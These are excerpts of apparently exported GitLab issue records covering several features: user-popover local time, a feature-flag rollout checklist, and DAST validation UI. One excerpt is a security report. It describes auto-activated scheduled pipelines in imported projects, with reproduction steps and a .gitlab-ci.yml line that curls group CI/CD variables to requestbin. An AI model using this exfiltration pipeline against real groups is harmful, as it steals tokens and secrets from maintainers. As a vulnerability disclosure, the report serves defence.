Expose `local_time` to the API in [lib/api/entities/user.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/api/entities/user.rb)\n\n```ruby\nexpose :local_time do |user|\n  local_time(user.timezone)\nend\n```\n\n2. Pass `localTime` to the Vue component in [app/assets/javascripts/user_popovers.js#L47](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/user_popovers.js#L47)\n3. Render the local time in [app/assets/javascripts/vue_shared/components/user_popover/user_popover.vue#L96](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/vue_shared/components/user_popover/user_popover.vue#L96)\n4. Update specs\n   - [spec/frontend/vue_shared/components/user_popover/user_popover_spec.js](https://gitlab.com/gitlab-org/gitlab/-/blob/master/spec/frontend/vue_shared/components/user_popover/user_popover_spec.js)\n   - [spec/lib/api/entities/user_spec.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/spec/lib/api/entities/user_spec.rb)\n   - [spec/features/projects/user_sees_user_popover_spec.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/spec/features/projects/user_sees_user_popover_spec.rb)\n\n\n\u003c!--- Use the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n\nConsider adding related issues and epics to this issue. You can also reference the Feature Proposal Template (https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md) for additional details to consider adding to this issue. Additionally, as a data oriented organization, when your feature exits planning breakdown, consider adding the `What does success look like, and how can we measure that?` section.\n\nOther sections to consider adding: \n\n### Intended users\n\nWho will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager) \n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops) \n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n\n\n### User experience goal\n\nWhat is the single user experience workflow this problem addresses? \nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ \n\n\n### Further details\n\nInclude use cases, benefits, goals, or any other details that will help us understand the problem better. \n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members \n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members \n\n### Documentation\n\n See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html \n\n### Availability \u0026 Testing\n\nThis section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning \n\n### What does success look like, and how can we measure that?\n\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. \n\n### What is the type of buyer?\n\nWhat is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#three-tiers\n\n### Is this a cross-stage feature?\n\nCommunicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e","state":"closed","created_at":"2021-08-09T05:17:42.199Z","updated_at":"2021-10-08T14:36:32.106Z","closed_at":"2021-10-08T14:35:37.392Z","closed_by":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"labels":["Category:Authentication and Authorization","Category:User Management","FY22::Q3","GitLab Free","GitLab Premium","GitLab Ultimate","candidate::14.4","devops::manage","direction","documentation","frontend","group::authentication and authorization","priority::3","quad-planning::complete-no-action","section::dev","type::feature","user profile","workflow::production"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"}],"author":{"id":4156460,"username":"ogolowinski","name":"Orit Golowinski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4156460/avatar.png","web_url":"https://gitlab.com/ogolowinski"},"type":"ISSUE","assignee":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337935","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337935","notes":"https://gitlab.com/api/v4/projects/278964/issues/337935/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337935/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337935","relative":"#337935","full":"gitlab-org/gitlab#337935"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91650786,"iid":337932,"project_id":278964,"title":"DAST On-Demand - Opening validation modal should not always create a new validation token","description":"## Problem\n\nWhen validating a site, you must keep the window open while working through the validation process.

Security\n- Most appropriate slack channel to reach out to: `#g_protect_container_security`\n- Best individual to reach out to: @aturinske \n- PM: @sam.white \n\n## The Rollout Plan\n\n- Rollout Feature for everyone as soon as it's ready\n\n## Testing Groups/Projects/Users\n\nStaging\n\n* `defend-team-test/cnp-alert-demo` project\n\nProduction\n\n* `protect/demos/container-network-policy` project\n\n\n## Expectations\n\n### What are we expecting to happen?\n\n- on the project/group/instance-level vulnerability reports, a new tab will be available called `Operational vulnerabilities` that contains only the results from the `Cluster Image Scanning` scanner. These results will no longer be available in the `Development vulnerabilities` and there will no longer be a dropdown option to filter by them\n\n### What might happen if this goes wrong?\n\n- the `operational vulnerabilities` tab does not show the expected vulnerabilities\n- the `development vulnerabilities` tab does not work as expected\n\n### What can we monitor to detect problems with this?\n\n- PM complaints\n- customer complaints\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- [ ] Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set operational_vulnerabilities true --dev`\n    - [ ] `/chatops run feature set operational_vulnerabilities true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [ ] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e operational_vulnerabilities true`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set operational_vulnerabilities \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set operational_vulnerabilities \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set operational_vulnerabilities true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `operational_vulnerabilities`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `operational_vulnerabilities` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete operational_vulnerabilities --dev`\n    - [ ] `/chatops run feature delete operational_vulnerabilities --staging`\n    - [ ] `/chatops run feature delete operational_vulnerabilities`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set operational_vulnerabilities false\n```","state":"closed","created_at":"2021-08-06T21:45:11.109Z","updated_at":"2021-09-21T20:01:48.421Z","closed_at":"2021-09-21T19:46:55.474Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["GitLab Ultimate","[deprecated] Accepting merge requests","auto updated","devops::govern","feature flag","frontend","frontend-weight::2","group::security policies","section::sec","type::feature","workflow::ready for development"],"milestone":null,"assignees":[],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":null,"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337891","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":47,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 47 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337891","notes":"https://gitlab.com/api/v4/projects/278964/issues/337891/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337891/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":"https://gitlab.com/api/v4/projects/278964/issues/341423"},"references":{"short":"#337891","relative":"#337891","full":"gitlab-org/gitlab#337891"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91581892,"iid":337884,"project_id":278964,"title":"Add warning text to validation popup to keep window open during validation","description":"#### Problem\n\nWhen validating a site, you must keep the window open while working through the validation process.

Download the text file\n3. **_In a separate tab_**, upload the file to your project, open a merge request, wait for pipeline to finish deploy job (Note: these steps do depend on your project permission level. You could add the file locally and push directly to `master`, wait for the deployment, and then just return to validation)\n4. Return to validate window still open, confirm location, click validate\n\nIf you accidentally refresh the page or close the validation modal after you upload the file (and deploy the changes), you'll have to restart the process.\n\n#### Proposal\n\n- Change the way we generate these files.

when a package was in an \"error\" state after failing background processing and also a \"pending\" state during background processing. \n\nWe should add a `status_message` column to the package model

If that person imports the crafted project to their group, the imported project will, after some time, run an active scheduled pipeline on behalf of the importer (group owner or maintainer). If the run succeeds (the scheduled pipeline is not deleted/disabled in time), an attacker can steal group ci/cd variables via a curl request. \n\nThese group ci/cd variables can be personal access tokens of maintainers/owners (that can also allow an attacker to access other projects of maintainer/owner), passwords, other secrets.\n\n#####  Steps to reproduce\n\n1. Download ![2021-07-21_17-27-555_342gfdg_test321_export.tar.gz](https://h1.sec.gitlab.net/a/13024a65-9782-40ef-9e14-e93446baf9a5/2021-07-21_17-27-555_342gfdg_test321_export.tar.gz) custom made/exported project  \n2. Create a group  \n3. Go to group settings and add a custom ci/cd variable named \"TEST_VAR\"\n\n![bandicam_2021-07-21_22-19-08-445.jpg](https://h1.sec.gitlab.net/a/29ba0f64-cff6-4ab1-a008-40eb28daea67/bandicam_2021-07-21_22-19-08-445.jpg)\n\n4. Import the previously downloaded custom project to the group  \n5. After the project has been imported, go to the scheduled pipelines page **CI/CD** -\u003e **Schedules**  \n6. You should see that the pipeline is automatically active after import and is set to run after x minutes (I think it's possible to make it run after less than 30 minutes)  \n7. It is possible to speed up the pipeline run by just clicking the \"Play\" button (it will run either way)  \n8. The pipeline run should send a curl request containing secret ci/cd variables to requestbin (or an attacker controlled website)\n\nVideo poc: ![bandicam_2021-07-21_21-32-20-832.avi](https://h1.sec.gitlab.net/a/fe0800d8-faaa-446c-9aff-b6cb27e3023b/bandicam_2021-07-21_21-32-20-832.avi)\n\nThe hardest part of this attack is user interaction. An attacker can collect ci/cd variable names from .gitlab-ci.yml files (if the projects in that group are public or if the attacker has at least reporter access to the private group)\n\nTo create your own custom made project:\n\n1. Create a public project  \n2. Add a .gitlab-ci.yml to the main protected branch with the following code:\n\n```  \nbuild:  \n  script:  \n    - curl \"https://requestbin.net/r/8acffaos?var=$TEST_VAR\"  \n    - echo $TEST_VAR  \n```  \n3. Add a scheduled pipeline to the main protected branch with a custom interval pattern `*/5 * * * *`  \n4. Export the project\n\nI have managed to get an automatic pipeline to run just after 5 minutes of importing on my other tries. Other times it runs after 30 minutes even though it's set to run every 5 minutes.\n\nMaybe there are better attack scenarios using this vulnerability, but this is the best one I've found so far.\n\n#####  What is the current *bug* behavior?\n\nThe scheduled pipelines are automatically set to \"Active\" after import\n\n#####  What is the expected *correct* behavior?\n\nThe scheduled pipelines should always be set to inactive after import and it should be impossible to set them to \"active\" in the exported project file (pipeline_schedules.ndjson)\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\n####  Impact\n\nAn attacker can steal group ci/cd variables by creating a custom project and sharing it with group maintainers/owners.\n\n##

They are showing us that we are getting into a mix of responsibilities that we might need to address soon (?):\n    \u003e 1. `Gcs::Convert` only concern should be to convert the output file from the analyzer into a single format where we can output both as a table and report file. So it could be seen as a post processing mechanism for the overall scanned/vulnerability data and therefore it should keep only the data required throughout the conversion process (it has never stored vulnerabilities for example).\n    \u003e \n    \u003e 1. Although we have `Gcs::Remediation` already as an encapsulated entity, it seems that we might need something like `Gcs::Remediations` which would handle values and behaviours specific to the group of `Gcs::Remediation` (e.g., unsupported os info, checking for duplication, checking for applicability).\n    \u003e \n    \u003e 1.
